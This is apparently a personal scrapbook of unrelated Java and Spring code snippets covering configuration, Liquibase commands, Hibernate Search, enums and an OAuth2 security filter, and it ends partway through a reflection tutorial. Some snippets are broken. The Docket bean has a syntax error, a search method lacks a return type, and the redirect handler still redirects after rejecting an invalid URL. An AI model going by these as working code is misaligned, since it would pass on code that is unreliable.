                outputStream.flush();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (IOException ex) {
                try {
                    fileData.getFileStream().close();
                } catch (IOException closingException) {
                    log.warn("could not close command result, a http connection may be leaked!", closingException);
                }
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private Consumer<DownloadStatus> notifyEvent(final FileData fileData) {
        return status -> this.getEventPublisher().publishEvent(new DownloadEvent(this, MessageEntity.of(fileData.getSessionId(), status)));
    }
}

-------------------------------------------------------------------------------------------------------
    //    private Type pageableMixin() {
//        return new AlternateTypeBuilder()
//                .fullyQualifiedClassName(
//                        String.format("%s.generated.%s",
//                                Pageable.class.getPackage().getName(),
//                                Pageable.class.getSimpleName()))
//                .withProperties(Arrays.asList(
//                        property(Integer.class, "page"),
//                        property(Integer.class, "limit"),
//                        property(String.class, "sort")
//                ))
//                .build();
//    }
-------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebMvc
public class WebConfig extends WebMvcConfigurerAdapter {


@Override
public void addViewControllers(ViewControllerRegistry registry) {

    registry.addRedirectViewController("/v1/subscriptions/doc", "/doc?group=subscriptions");


}
}
-------------------------------------------------------------------------------------------------------
### direct log messages to stdout ###
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.Target=System.out
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%d{ABSOLUTE} %5p %c{1}:%L - %m%n
 
### direct messages to file hibernate.log ###
#log4j.appender.file=org.apache.log4j.FileAppender
#log4j.appender.file.File=hibernate.log
#log4j.appender.file.layout=org.apache.log4j.PatternLayout
#log4j.appender.file.layout.ConversionPattern=%d{ABSOLUTE} %5p %c{1}:%L - %m%n
 
### set log levels - for more verbose logging change 'info' to 'debug' ###
 
log4j.rootLogger=warn, stdout
 
log4j.logger.javax.naming=none
 
#log4j.logger.org.hibernate=info
log4j.logger.org.hibernate=warn
 
### log HQL query parser activity
#log4j.logger.org.hibernate.hql.ast.AST=debug
 
### log just the SQL
log4j.logger.org.hibernate.SQL=debug
 
### log JDBC bind parameters ###
log4j.logger.org.hibernate.type=debug
 
### log schema export/update ###
#log4j.logger.org.hibernate.tool.hbm2ddl=debug
 
### log HQL parse trees
#log4j.logger.org.hibernate.hql=debug
 
### log cache activity ###
#log4j.logger.org.hibernate.cache=debug
 
### log transaction activity
#log4j.logger.org.hibernate.transaction=debug
 
### log JDBC resource acquisition
#log4j.logger.org.hibernate.jdbc=debug
 
### enable the following line if you want to track down connection ###
### leakages when using DriverManagerConnectionProvider ###
#log4j.logger.org.hibernate.connection.DriverManagerConnectionProvider=trace
-------------------------------------------------------------------------------------------------------
@Entity
@Where(clause = "DELETED = 0")
public class Foo {
    // other mappings
 
    @Column(name = "DELETED")
    private Integer deleted = 0;
     
    // getters and setters
 
    public void setDeleted() {
        this.deleted = 1;
    }
}
-------------------------------------------------------------------------------------------------------
    IntFunction<IntFunction<String>> function = i -> j -> String.format("%d x %2d = %2d", i, j, i * j);
    IntFunction<IntFunction<IntFunction<String>>> repeaterX = count -> i -> j ->
            IntStream.range(0, count)
                    .mapToObj(delta -> function.apply(i + delta).apply(j))
                    .collect(Collectors.joining("\t"));
    IntFunction<IntFunction<IntFunction<IntFunction<String>>>> repeaterY = countY -> countX -> i -> j ->
            IntStream.range(0, countY)
                    .mapToObj(deltaY -> repeaterX.apply(countX).apply(i).apply(j + deltaY))
                    .collect(Collectors.joining("\n"));
    IntFunction<String> row = i -> repeaterY.apply(10).apply(4).apply(i).apply(1) + "\n";
    IntStream.of(2, 6).mapToObj(row).forEach(System.out::println);

-------------------------------------------------------------------------------------------------------
@PostMapping("/result")
    public String result(@Valid @ModelAttribute("employee") Employee employee, BindingResult bindingResult){
        List<FieldError> errors = bindingResult.getFieldErrors();
        for (FieldError error : errors ) {
         System.out.println (error.getObjectName() + " - " +error.getDefaultMessage());
        }
        System.out.print(employee.getName()); 
        empService.save(employee);
        return "result"; 
    }
-------------------------------------------------------------------------------------------------------
@XmlRootElement(name = "employee")
@XmlAccessorType(XmlAccessType.FIELD)
public class EmployeeVO extends ResourceSupport implements Serializable
{
    private Integer employeeId;
    private String firstName;
    private String lastName;
    private String email;
 
    public EmployeeVO(Integer id, String firstName, String lastName, String email) {
        super();
        this.employeeId = id;
        this.firstName = firstName;
        this.lastName = lastName;
        this.email = email;
    }
 
    public EmployeeVO() {
    }
     
    //Removed setter/getter for readability
}
-------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>joda-time</groupId>
    <artifactId>joda-time</artifactId>
    <version>2.10</version>
</dependency>
-------------------------------------------------------------------------------------------------------
    /**
     * Returns {@link CustomEditorConfigurer}
     *
     * @return {@link CustomEditorConfigurer}
     */
    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnClass(CustomEditorConfigurer.class)
    @Description("Kafka custom editor configurer bean")
    public CustomEditorConfigurer customEditorConfigurer() {
        final CustomEditorConfigurer configurer = new CustomEditorConfigurer();
//        final Map<Class<?>, Class<? extends PropertyEditor>> customEditors = new HashMap<>();
//        customEditors.put(KafkaConsumerAutoOffsetResetType.class, CustomEnumEditor.class);
//        customEditors.put(KafkaProducerAcknowledgementType.class, CustomEnumEditor.class);
//        customEditors.put(KafkaProducerCompressionType.class, CustomEnumEditor.class);
//        configurer.setCustomEditors(customEditors);
        configurer.setPropertyEditorRegistrars(
            new PropertyEditorRegistrar[]{
                new DatePropertyEditorRegistrar("yyyy-MM-dd"),
                new EnumPropertyEditorRegistrar()
            });
        return configurer;
    }
-------------------------------------------------------------------------------------------------------
    @Configuration
    @PropertySource("classpath:app.properties")
    public class Config {
        @Bean
        public ClientBean clientBean () {
            return new ClientBean();
        }

        @Bean
        @Qualifier("tradePrice")
        public Double getPrice (Environment env) {
            NumberFormat numberFormat = new DecimalFormat("##,###.00");
            CustomNumberEditor customNumberEditor = new CustomNumberEditor(
                                                Double.class, numberFormat, true);
            customNumberEditor.setAsText(env.getProperty("thePrice"));
            return (Double) customNumberEditor.getValue();
        }
    }

https://www.logicbig.com/tutorials/spring-framework/spring-core/property-editors.html

public class DefaultEditorsTest {
    public static void main (String[] args) {
        BeanWrapperImpl wrapper = new BeanWrapperImpl();

        PropertyEditor editor = wrapper.getDefaultEditor(Currency.class);
        editor.setAsText("MYR");
        Currency value = (Currency) editor.getValue();
        System.out.println(value.getDisplayName());

    }
}

		Binder.get(environment).bind("spring.output.ansi.enabled", AnsiOutput.Enabled.class)
				.ifBound(AnsiOutput::setEnabled);
-------------------------------------------------------------------------------------------------------
    @org.springframework.boot.test.context.TestConfiguration
    public static class TestConfiguration {

        @Autowired
        private Environment environment;

        @Bean
        @ConfigurationProperties(prefix = "kafka.consumer", ignoreInvalidFields = true)
        public KafkaConsumerProperty kafkaConsumerProperty() {
            return new KafkaConsumerProperty();
        }

        @PostConstruct
        public void test() {
            Binder.get(this.environment).bind("kafka.consumer.auto-offset-reset", KafkaConsumerAutoOffsetResetType.class);
        }
    }
-------------------------------------------------------------------------------------------------------
public enum Element {
 
    // ... enum values
 
    private static final Map<String, Element> BY_LABEL = new HashMap<>();
     
    static {
        for (Element e: values()) {
            BY_LABEL.put(e.label, e);
        }
    }
 
   // ... fields, constructor, methods
 
    public static Element valueOfLabel(String label) {
        return BY_LABEL.get(label);
    }
}

public enum Element {
    H("Hydrogen", 1, 1.008f),
    HE("Helium", 2, 4.0026f),
    // ...
    NE("Neon", 10, 20.180f);
 
    private static final Map<String, Element> BY_LABEL = new HashMap<>();
    private static final Map<Integer, Element> BY_ATOMIC_NUMBER = new HashMap<>();
    private static final Map<Float, Element> BY_ATOMIC_WEIGHT = new HashMap<>();
     
    static {
        for (Element e : values()) {
            BY_LABEL.put(e.label, e);
            BY_ATOMIC_NUMBER.put(e.atomicNumber, e);
            BY_ATOMIC_WEIGHT.put(e.atomicWeight, e);
        }
    }
 
    public final String label;
    public final int atomicNumber;
    public final float atomicWeight;
 
    private Element(String label, int atomicNumber, float atomicWeight) {
        this.label = label;
        this.atomicNumber = atomicNumber;
        this.atomicWeight = atomicWeight;
    }
 
    public static Element valueOfLabel(String label) {
        return BY_LABEL.get(label);
    }
 
    public static Element valueOfAtomicNumber(int number) {
        return BY_ATOMIC_NUMBER.get(number);
    }
 
    public static Element valueOfAtomicWeight(float weight) {
        return BY_ATOMIC_WEIGHT.get(weight);
    }
}
-------------------------------------------------------------------------------------------------------
public enum AppProperty {

FOO(“app.foo”), // no default

BAR(“app.soup”, “false”); // no soup for you

// enum state doesn’t have to be final…but doing otherwise

// is almost always a bad idea – don’t do it!

private final String propertyKey;

private final String defaultValue;

private AppProperty(String propertyKey) {

this(propertyKey, null);

}

private AppProperty(String propertyKey, String defaultValue) {

this.propertyKey = propertyKey;

this.defaultValue = defaultValue;

}

public String getPropertyKey() {

return this.propertyKey;

}

public String getDefaultValue() {

return this.defaultValue;

}

public String computeValue(Properties props) {

return props.getProperty(getPropertyKey(), getDefaultValue());

}

}
-------------------------------------------------------------------------------------------------------
public class HeaderVersionArgumentResolver
  implements HandlerMethodArgumentResolver {
 
    @Override
    public boolean supportsParameter(MethodParameter methodParameter) {
        return methodParameter.getParameterAnnotation(Version.class) != null;
    }
 
    @Override
    public Object resolveArgument(
      MethodParameter methodParameter, 
      ModelAndViewContainer modelAndViewContainer, 
      NativeWebRequest nativeWebRequest, 
      WebDataBinderFactory webDataBinderFactory) throws Exception {
  
        HttpServletRequest request 
          = (HttpServletRequest) nativeWebRequest.getNativeRequest();
 
        return request.getHeader("Version");
    }
}

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.PARAMETER)
public @interface Version {
}

@Configuration
public class WebConfig implements WebMvcConfigurer {
 
    //...
 
    @Override
    public void addArgumentResolvers(
      List<HandlerMethodArgumentResolver> argumentResolvers) {
        argumentResolvers.add(new HeaderVersionArgumentResolver());
    }
}

@GetMapping("/entity/{id}")
public ResponseEntity findByVersion(
  @PathVariable Long id, @Version String version) {
    return ...;
}
-------------------------------------------------------------------------------------------------------
public class StringToAbstractEntityConverterFactory 
  implements ConverterFactory<String, AbstractEntity>{
 
    @Override
    public <T extends AbstractEntity> Converter<String, T> getConverter(Class<T> targetClass) {
        return new StringToAbstractEntityConverter<>(targetClass);
    }
 
    private static class StringToAbstractEntityConverter<T extends AbstractEntity>
      implements Converter<String, T> {
 
        private Class<T> targetClass;
 
        public StringToAbstractEntityConverter(Class<T> targetClass) {
            this.targetClass = targetClass;
        }
 
        @Override
        public T convert(String source) {
            long id = Long.parseLong(source);
            if(this.targetClass == Foo.class) {
                return (T) new Foo(id);
            }
            else if(this.targetClass == Bar.class) {
                return (T) new Bar(id);
            } else {
                return null;
            }
        }
    }
}
-------------------------------------------------------------------------------------------------------
@ConfigurationProperties(prefix = "conversion")
public class PropertyConversion {
 
    private Duration timeInDefaultUnit;
    private Duration timeInNano;
    ...
}

@DurationUnit(ChronoUnit.DAYS)
private Duration timeInDays;

@Component
@ConfigurationPropertiesBinding
public class EmployeeConverter implements Converter<String, Employee> {
 
    @Override
    public Employee convert(String from) {
        String[] data = from.split(",");
        return new Employee(data[0], Double.parseDouble(data[1]));
    }
}
-------------------------------------------------------------------------------------------------------
//    @Autowired
//    private PropertyEditorRegistrar propertyEditorRegistrar;

    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnClass(CustomEditorConfigurer.class)
    @Description("Kafka custom editor configurer bean")
    public CustomEditorConfigurer customEditorConfigurer() {
        final CustomEditorConfigurer configurer = new CustomEditorConfigurer();
//        final Map<Class<?>, Class<? extends PropertyEditor>> customEditors = new HashMap<>();
//        customEditors.put(Ticket.class, TicketTypeEditor.class);
//        configurer.setCustomEditors(customEditors);
        configurer.setPropertyEditorRegistrars(new PropertyEditorRegistrar[]{new CustomDateEditorRegistrar()});
        return configurer;
    }
-------------------------------------------------------------------------------------------------------
Letter  Date or Time Component  Presentation        Examples
------  ----------------------  ------------------  -------------------------------------
G       Era designator          Text                AD
y       Year                    Year                1996; 96
Y       Week year               Year                2009; 09
M/L     Month in year           Month               July; Jul; 07
w       Week in year            Number              27
W       Week in month           Number              2
D       Day in year             Number              189
d       Day in month            Number              10
F       Day of week in month    Number              2
E       Day in week             Text                Tuesday; Tue
u       Day number of week      Number              1
a       Am/pm marker            Text                PM
H       Hour in day (0-23)      Number              0
k       Hour in day (1-24)      Number              24
K       Hour in am/pm (0-11)    Number              0
h       Hour in am/pm (1-12)    Number              12
m       Minute in hour          Number              30
s       Second in minute        Number              55
S       Millisecond             Number              978
z       Time zone               General time zone   Pacific Standard Time; PST; GMT-08:00
Z       Time zone               RFC 822 time zone   -0800
X       Time zone               ISO 8601 time zone  -08; -0800; -08:00

String string = "January 2, 2010";
DateFormat format = new SimpleDateFormat("MMMM d, yyyy", Locale.ENGLISH);
Date date = format.parse(string);
System.out.println(date); // Sat Jan 02 00:00:00 GMT 2010

Input string                            Pattern
------------------------------------    ----------------------------
2001.07.04 AD at 12:08:56 PDT           yyyy.MM.dd G 'at' HH:mm:ss z
Wed, Jul 4, '01                         EEE, MMM d, ''yy
12:08 PM                                h:mm a
12 o'clock PM, Pacific Daylight Time    hh 'o''clock' a, zzzz
0:08 PM, PDT                            K:mm a, z
02001.July.04 AD 12:08 PM               yyyyy.MMMM.dd GGG hh:mm aaa
Wed, 4 Jul 2001 12:08:56 -0700          EEE, d MMM yyyy HH:mm:ss Z
010704120856-0700                       yyMMddHHmmssZ
2001-07-04T12:08:56.235-0700            yyyy-MM-dd'T'HH:mm:ss.SSSZ
2001-07-04T12:08:56.235-07:00           yyyy-MM-dd'T'HH:mm:ss.SSSXXX
2001-W27-3                              YYYY-'W'ww-u


-------------------------------------------------------------------------------------------------------
package com.javacodegeeks;
 
import org.junit.Assert;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.Mockito;
import org.powermock.api.mockito.PowerMockito;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.junit4.PowerMockRunner;
 
/**
* Test class for PowerMockSpyExample
* @author Meraj
*/
@RunWith(PowerMockRunner.class)
@PrepareForTest(PowerMockSpyExample.class)
public class PowerMockSpyExampleTest {
 
  @Test
  public void testGetCurrentDateAsString() {
    PowerMockSpyExample spy = PowerMockito.spy(new PowerMockSpyExample());
 
    Mockito.when(spy.getCurrentDateAsString()).thenReturn("Test Date");
    String actual = spy.getCurrentDateAsString();
    Assert.assertEquals("Test Date", actual);
    Mockito.verify(spy, Mockito.times(1)).getCurrentDateAsString();
  }
 
}
-------------------------------------------------------------------------------------------------------
List<T> intersect = list1.stream()
    .filter(list2::contains)
    .collect(Collectors.toList());

List<T> union = Stream.concat(list1.stream(), list2.stream())
    .distinct()
    .collect(Collectors.toList());
-------------------------------------------------------------------------------------------------------
@Test
public void whenFilteringAndTransformingCollection_thenCorrect() {
    Predicate<String> predicate = new Predicate<String>() {
        @Override
        public boolean apply(String input) {
            return input.startsWith("A") || input.startsWith("T");
        }
    };
 
    Function<String, Integer> func = new Function<String,Integer>(){
        @Override
        public Integer apply(String input) {
            return input.length();
        }
    };
 
    List<String> names = Lists.newArrayList("John", "Jane", "Adam", "Tom");
    Collection<Integer> result = FluentIterable.from(names)
                                               .filter(predicate)
                                               .transform(func)
                                               .toList();
 
    assertEquals(2, result.size());
    assertThat(result, containsInAnyOrder(4, 3));
}
-------------------------------------------------------------------------------------------------------
@Test
public void givenListOfCustomers_whenTransformed_thenListOfAddress() {
    Collection<Address> addressCol = CollectionUtils.collect(list1, 
      new Transformer<Customer, Address>() {
        public Address transform(Customer customer) {
            return customer.getAddress();
        }
    });
     
    List<Address> addressList = new ArrayList<>(addressCol);
    assertTrue(addressList.size() == 3);
    assertTrue(addressList.get(0).getLocality().equals("locality1"));
}
-------------------------------------------------------------------------------------------------------


<dependency>
    <groupId>io.springfox</groupId>
    <artifactId>springfox-data-rest</artifactId>
    <version>2.9.2</version>
</dependency>


-------------------------------------------------------------------------------------------------------
       protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
        .anyRequest().authenticated()
        .and().exceptionHandling().accessDeniedHandler(new AccessDeniedHandlerImpl())
        .and().logout().logoutSuccessHandler(new HttpStatusReturningLogoutSuccessHandler())
        .and().csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        .and()
        .addFilterBefore(ssoFilter(ApplicationConfiguration.API_BASE_PATH + "/login"), BasicAuthenticationFilter.class)
        .requiresChannel().anyRequest().requireSecure();
  }

  @Bean
  public FilterRegistrationBean oauth2ClientFilterRegistration(OAuth2ClientContextFilter filter) {
    FilterRegistrationBean frb = new FilterRegistrationBean();
    frb.setFilter(filter);
    frb.setOrder(SecurityProperties.DEFAULT_FILTER_ORDER);
    return frb;
  }

  @Bean
  @ConfigurationProperties("oauth2.client")
  public OAuth2ProtectedResourceDetails authDetails() {
    return new AuthorizationCodeResourceDetails();
  }

  @Bean
  public SecurityConfiguration swaggerSecurityConfiguration() {
    return new SecurityConfiguration("client-id", "client-secret", "realm",
        "", "{{X-XSRF-COOKIE}}", ApiKeyVehicle.HEADER, "X-XSRF-TOKEN", ",");
  }

  private Filter ssoFilter(String path) {
    OAuth2ClientAuthenticationProcessingFilter oAuth2ClientAuthenticationFilter = new OAuth2ClientAuthenticationProcessingFilter(path);
    OAuth2RestTemplate oAuth2RestTemplate = new OAuth2RestTemplate(authDetails(), oauth2ClientContext);
    DefaultRedirectStrategy defaultRedirectStrategy = new DefaultRedirectStrategy();
    oAuth2ClientAuthenticationFilter.setRestTemplate(oAuth2RestTemplate);
    oAuth2ClientAuthenticationFilter.setTokenServices(resourceServerTokenServices);
    oAuth2ClientAuthenticationFilter.setAuthenticationSuccessHandler(
        (request, response, authentication) -> {
          String redirectUrl = request.getParameter(REDIRECT_URL_PARAM);
          if (redirectUrl == null) {
            redirectUrl = DEFAULT_REDIRECT_URL;
          } else {
            if (!redirectUrlValidator.validateRedirectUrl(redirectUrl)) {
              request.setAttribute(MESSAGE_ATTRIBUTE_NAME,
                  messageSource.getMessage("ivalid.redirect.url", new String[] { redirectUrl }, LocaleContextHolder.getLocale()));
              response.sendError(HttpStatus.FORBIDDEN.value());
            }
          }
          defaultRedirectStrategy.sendRedirect(request, response, redirectUrl);
        });
    return oAuth2ClientAuthenticationFilter;
  }
-------------------------------------------------------------------------------------------------------
  @Bean
  public Docket api() throws IOException, URISyntaxException {
    final List<ResponseMessage> globalResponses = Arrays.asList(
        new ResponseMessageBuilder()
            .code(200)
            .message("OK")
            .build(),
        new ResponseMessageBuilder()
            .code(400)
            .message("Bad Request")
            .build(),
        new ResponseMessageBuilder()
            .code(500)
            .message("Internal Error")
            .build());
    final ApiInfo apiInfo = new ApiInfo("REST API", new BufferedReader(new InputStreamReader(getClass().getResourceAsStream(CHANGELOG_FILENAME)))
        .lines()
        .collect(Collectors.joining(System.lineSeparator())),
        "1.0.0-RC1", "", new Contact("team", "", "bla@bla.com"), "", "", Collections.emptyList());
    return new Docket(DocumentationType.SWAGGER_2),
        .securitySchemes(Arrays.asList(new ApiKey("Token Access", HttpHeaders.AUTHORIZATION, In.HEADER.name()))))
        .useDefaultResponseMessages(false)
        .globalResponseMessage(RequestMethod.GET, globalResponses)
        .globalResponseMessage(RequestMethod.POST, globalResponses)
        .globalResponseMessage(RequestMethod.DELETE, globalResponses)
        .globalResponseMessage(RequestMethod.PATCH, globalResponses)
        .select()
        .apis(RequestHandlerSelectors.basePackage("com.controller"))
        .build()
        .apiInfo(apiInfo)
        .directModelSubstitute(Temporal.class, String.class);
  }
-------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping
@SessionAttributes("reservation")
public class ReservationFormController {
 
    private ReservationService reservationService;
    private ReservationValidator validator;
 
    @Autowired
    public ReservationFormController(ReservationService reservationService, ReservationValidator validator){
        this.reservationService = reservationService;
        this.validator = validator;
    }
 
    @Autowired
    private ConversionService conversionService;
    @InitBinder
    protected void initBinder(ServletRequestDataBinder binder) {
        binder.setConversionService(conversionService);
    }
 
    /*@InitBinder
    protected void initBinder(ServletRequestDataBinder binder) {
        binder.registerCustomEditor(Date.class, new CustomDateEditor(new SimpleDateFormat("dd-MM-yyyy"), true));
        binder.registerCustomEditor(SportType.class, new SportTypeEditorSupport(reservationService));
    }*/
 
    /*@Autowired
    private PropertyEditorRegistrar propertyEditorRegistrar;
    @InitBinder
    protected void initBinder(ServletRequestDataBinder binder) {
        propertyEditorRegistrar.registerCustomEditors(binder);
    }*/
 
    @ModelAttribute("sportTypes")
    public Iterable<SportType> getSportTypes(){
        return SportType.list();
    }
 
    @RequestMapping(value="/reservationForm/{userName}", method=RequestMethod.GET)
    public String initForm(Model model, @PathVariable String userName){
        Reservation reservation = new Reservation();
        reservation.setPlayer(new Player(userName, null));
        reservation.setSportType(SportType.TENNIS);
        model.addAttribute("reservation", reservation);
        return "reservationForm";
    }
 
    @RequestMapping(value="/reservationForm/{userName}",method=RequestMethod.POST)
    public String reserve(@Valid Reservation reservation, BindingResult bindingResult, SessionStatus sessionStatus){
        validator.validate(reservation, bindingResult);
        if(bindingResult.hasErrors()){
            return "/reservationForm";
        } else{
            reservationService.make(reservation);
            sessionStatus.setComplete();
            return "redirect:../reservationSuccess";
        }
    }
 
    @RequestMapping("/reservationSuccess")
    public void success(){
 
    }
}
-------------------------------------------------------------------------------------------------------
    @RequestMapping(value="/reservationForm/{captainName}",method=RequestMethod.POST)
    public String reserve(@Valid Reservation reservation, BindingResult bindingResult, SessionStatus sessionStatus){
        validator.validate(reservation, bindingResult);
        if(bindingResult.hasErrors()){
            return "/reservationForm";
        } else{
            reservationService.make(reservation);
            sessionStatus.setComplete();
            return "redirect:../reservationSuccess";
        }
    }
-------------------------------------------------------------------------------------------------------
liquibase 
 --driver=com.microsoft.sqlserver.jdbc.SQLServerDriver 
 --classpath="C:\\Program Files\\Microsoft JDBC Driver 6.0 for SQL Server\\sqljdbc_6.0\\enu\\jre8\\sqljdbc42.jar" 
 --url="jdbc:sqlserver://localhost:1433;databaseName=AdventureWorks2017;integratedSecurity=false;" 
 --changeLogFile="D:\Source\generateChangeLog.xml" 
 --username=liquibase 
 --password=liquibase@123  
 --logLevel=info
generateChangeLog
-------------------------------------------------------------------------------------------------------
<plugin>
            <groupId>org.liquibase</groupId>
            <artifactId>liquibase-maven-plugin</artifactId>
            <version>2.0.1</version>
            <configuration>
                <changeLogFile>src/main/resources/sql/postGre/changelog-master.xml</changeLogFile>
                <promptOnNonLocalDatabase>false</promptOnNonLocalDatabase>
                <defaultschemaName><<my application schema>> </defaultschemaName>
                <driver>org.postgresql.Driver</driver>
                <url>jdbc:<<mydburl>> </url>
                <username>user</username>
                <password>pwd</password>
            </configuration>
            <executions>
                <execution>
                    <goals>
                        <goal>update</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
-------------------------------------------------------------------------------------------------------
./liquibase --url=jdbc:mysql://localhost:3306/liquiblog --driver=com.mysql.jdbc.Driver --username=root --password="" --changeLogFile=db.changelog-0.1.0.xml update

<databasechangelog xmlns="http://www.liquibase.org/xml/ns/dbchangelog" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemalocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-2.0.xsd">
  <changeset id="init-1" author="mueller@synyx.de"> 
    <insert tablename="Person"> 
      <column name="name" value="John Doe"> 
      </column>
    </insert>
    <rollback> 
      DELETE FROM Person WHERE name LIKE 'John Doe'; 
    </rollback>
  </changeset>
</databasechangelog>

select id, md5sum, description from DATABASECHANGELOG; 
-------------------------------------------------------------------------------------------------------
java -Dfile.encoding=UTF-8 -Duser.language=en -Duser.country=US ^
-jar lib/liquibase.jar ^
--logLevel=info ^
--classpath=lib/liquibase-ojdbc.jar ^
--driver=oracle.jdbc.OracleDriver ^
--changeLogFile=install.xml ^
--url="jdbc:oracle:thin:@127.0.0.1:1521:xe" ^
--username=akk0rd87 ^
--password=12345 ^
update

create user akk0rd87 identified by "12345" default tablespace users quota 100m on users;
grant dba to akk0rd87;
-------------------------------------------------------------------------------------------------------
 <preConditions>
     <or>
         <and>
            <dbms type="oracle" />
            <runningAs username="SYSTEM" />
         </and>
         <and>
            <dbms type="mssql" />
            <runningAs username="sa" />
         </and>
     </or>
 </preConditions>
 <sqlCheck expectedResult="1">SELECT COUNT(1) FROM pg_tables WHERE TABLENAME = 'myRequiredTable'</sqlCheck>
-------------------------------------------------------------------------------------------------------
@Factory
    public Query getFilter() {
        return new BooleanQuery.Builder()
                .add(new TermQuery(new Term("avisDefinitifCet", this.avisDefinitifCet.toLowerCase())), BooleanClause.Occur.SHOULD)
                .add(new TermQuery(new Term("clasCet1ErPassage", this.clasCet1ErPassage.toLowerCase())), BooleanClause.Occur.SHOULD)
                .build();
    }
-------------------------------------------------------------------------------------------------------
https://grokonez.com/frontend/vue-js/vue-js-spring-boot-h2-database-example-embedded-mode-spring-data-jpa-restapis-crud-example

– jdbc:h2:mem is for in-memory databases.
– jdbc:h2:file is for disk-based databases.
-------------------------------------------------------------------------------------------------------
private Query createQuery(QueryBuilder queryBuilder, String fieldName, String term) {
  return queryBuilder
      .keyword()
      .onField( fieldName )
      .ignoreFieldBridge()
      .matching( term )
      .createQuery();
}

/**
 * @param fields
 * @param text
 * @return full text query
 */
protected QueryBuilder getFullTextQueryBuilder() {
  FullTextSession fullTextSession = getFullTextSession();
  return fullTextSession.getSearchFactory().buildQueryBuilder().forEntity(getEntityClass()).get();
}

Query combinedQuery = querybuilder
.bool()
    .should( firstNameQuery )
    .should( lastNameQuery )
.createQuery();
-------------------------------------------------------------------------------------------------------
@Transactional
public  search(String searchText) {
    FullTextEntityManager fullTextEntityManager = org.hibernate.search.jpa.Search
            .getFullTextEntityManager(entityManager);
    QueryBuilder qb = fullTextEntityManager.getSearchFactory().buildQueryBuilder().forEntity(Employee.class).get();
    org.apache.lucene.search.Query luceneQuery = qb.keyword().wildcard()
            .onFields("firstName", "middleName", "lastName").matching(searchText + "*").createQuery();
    javax.persistence.Query jpaQuery = fullTextEntityManager.createFullTextQuery(luceneQuery, Employee.class);
    List result = jpaQuery.getResultList();
    List<EmployeeSearchDTO> listOfDTO = new ArrayList<>();
    EmployeeSearchDTO employeeDTO;
    Iterator<Employee> itr = result.iterator();
    while (itr.hasNext()) {
        Employee employee = itr.next();
        employeeDTO = new EmployeeSearchDTO(employee);
        listOfDTO.add(employeeDTO);
    }
}
-------------------------------------------------------------------------------------------------------
@Indexed
public class PatientIdentifier extends BaseChangeableOpenmrsData implements java.io.Serializable, Cloneable, Comparable<PatientIdentifier> {

  @DocumentId
  private Integer patientIdentifierId;

  @IndexedEmbedded(includeEmbeddedObjectId = true)
  private Patient patient;

  @Fields({
      @Field(name = "identifierPhrase", analyzer = @Analyzer(definition = LuceneAnalyzers.PHRASE_ANALYZER), boost = @Boost(8f)),
      @Field(name = "identifierExact", analyzer = @Analyzer(definition = LuceneAnalyzers.EXACT_ANALYZER), boost = @Boost(4f)),
      @Field(name = "identifierStart", analyzer = @Analyzer(definition = LuceneAnalyzers.START_ANALYZER), boost = @Boost(2f)),
      @Field(name = "identifierAnywhere", analyzer = @Analyzer(definition = LuceneAnalyzers.ANYWHERE_ANALYZER))
  })
  private String identifier;

  @IndexedEmbedded(includeEmbeddedObjectId = true)
  private PatientIdentifierType identifierType;

  @Field
  private Boolean preferred = false;
-------------------------------------------------------------------------------------------------------
    @Override
        public void run() {
            doProcess();
        }
     
        private void doProcess() {
            ...
     
            try {
                sendResponse(asyncContext.getResponse().getWriter(), jsnResult);    
            } catch (IOException ex) {
                Logger.getLogger(AsyncRequestProcessor.class.getName()).log(Level.SEVERE, null, ex);
            }
     
            asyncContext.complete();
        }
     
        public void sendResponse(PrintWriter out, JSONObject jsnResp) {
            Logger.getLogger(AsyncRequestProcessor.class.getName()).info("AsyncRequestProcessor: sending response: " + jsnResp.toString());
            
            asyncContext.getResponse().setContentType("application/json");
            
            out.print(jsnResp.toString());
        }
-------------------------------------------------------------------------------------------------------
    @Lob
    @Field (name="text",index=Index.YES, analyze=Analyze.YES,store=Store.YES)
    public String getText() {
        return this.text;
    }
	
	@Entity
@Audited
@Inheritance(strategy = InheritanceType.JOINED)
public class AbstractDataObject extends BaseDomainModel {
    private Long objectId;

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @DocumentId
    public Long getObjectId() {
     return objectId;
    }
}
-------------------------------------------------------------------------------------------------------
    @FunctionalInterface
    public interface ExceptionResolver<T, E extends Throwable> {

        ResponseEntity<T> handle(final HttpServletRequest req, final E throwable, final HttpStatus status);
    }
-------------------------------------------------------------------------------------------------------
At Intertech we do a lot of sharing of expertise. Whether it’s someone on our team at that moment or a colleague working on another project, we make it a point to collaboratively share information to move all projects and clients forward. We also hope to share these quick tips with you in hopes it will help you someday in your work. Here is a quick tip I recently shared with my team that I thought you might find useful.

When a production code field should not have a setter method, typically in an immutable domain model, we need to use a different approach in tests for giving that field a value in an existing instance. This approach usually involves using Java’s reflection.

While directly using reflection for this is not difficult, it has some extra steps and checked exceptions to handle. The Spring ReflectionUtils class makes this a little easier. The following steps show how to use it.

1. Identify the object to set the value on (the one without the setter) and the value to set. In this example, “object” needs the “value” (no reflection in use in this step!).
MyEntity object = new MyEntity();
LocalDateTime value = LocalDateTime.now();
1
2
	
MyEntity object = new MyEntity();
LocalDateTime value = LocalDateTime.now();

2. Using reflection, obtain the Field reference from the class with the field to set. This step uses the Spring ReflectionUtils.findField method. This method takes two arguments, the Class having the field and the name of the field.
Field field = ReflectionUtils.findField(MyEntity.class, "createDate");
1
	
